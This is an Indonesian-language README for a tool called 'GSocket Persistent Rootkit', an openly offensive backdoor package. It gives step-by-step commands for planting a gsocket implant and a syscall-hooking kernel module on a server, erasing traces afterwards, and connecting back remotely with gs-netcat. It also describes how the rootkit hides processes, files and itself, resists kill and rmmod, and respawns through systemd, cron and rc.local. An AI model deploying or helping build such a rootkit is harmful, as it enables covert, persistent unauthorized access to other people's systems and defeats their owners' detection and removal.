# GSocket Persistent Rootkit

Persistent invisible GSocket backdoor dengan kernel-level protection.

---

## File

```
├── implant.c        — gsocket daemon + watchdog + self-delete
├── loader.py        — deploy implant + persistence + libstealth
├── gsock_protect.c  — kernel module (syscall hooks)
├── Makefile         — build kernel module
├── kmod_deploy.py   — deploy kernel module
```

---

## Konfigurasi

Edit **dua file ini** sebelum upload ke server:

**implant.c** baris 17:
```c
#define GSOCKET_KEY  "ISI_KEY_KAMU_DISINI"
```

**loader.py** baris 11:
```python
GSOCKET_KEY = "ISI_KEY_KAMU_DISINI"
```

Key harus sama di kedua file.

---

## Requirements

```bash
apt-get install -y build-essential linux-headers-$(uname -r) gcc
```

GSocket:
```bash
curl -fsSL https://gsocket.io/install.sh | bash
```

---

## Cara Jalankan

### Step 1 — Clone repo di server

```bash
cd /var/tmp
git clone https://github.com/USERNAME/REPO.git
cd REPO
```

### Step 2 — Deploy implant

```bash
python3 loader.py
```

### Step 3 — Deploy kernel module

```bash
python3 kmod_deploy.py
```

### Step 4 — Hapus jejak

```bash
cd /
rm -rf /var/tmp/REPO
```

### Step 5 — Connect dari lokal

```bash
gs-netcat -s KEY_KAMU -i
```

---

## Cara Kerja

```
kill -9 <pid>         → kernel hook → diabaikan → proses tetap hidup
rm /dev/shm/.kworker  → kernel hook → return ENOENT → file tetap ada
ps aux                → PID tersembunyi via getdents64 hook
lsmod                 → module tidak terlihat (self-hidden)
rmmod gsock_protect   → gagal (refcount protected)
reboot                → systemd + cron + rc.local respawn otomatis
```

---

## Troubleshooting

**loader.py stuck di "Launching implant..."**

Tidak akan terjadi di versi ini — sudah difix pakai `subprocess.Popen`.

**make error: redefinition of struct**

Tidak akan terjadi di versi ini — sudah difix, struct custom dihapus.

**Kernel headers tidak ada**

```bash
apt-get install -y linux-headers-$(uname -r)
```

**Module gagal load**

```bash
dmesg | tail -20
```
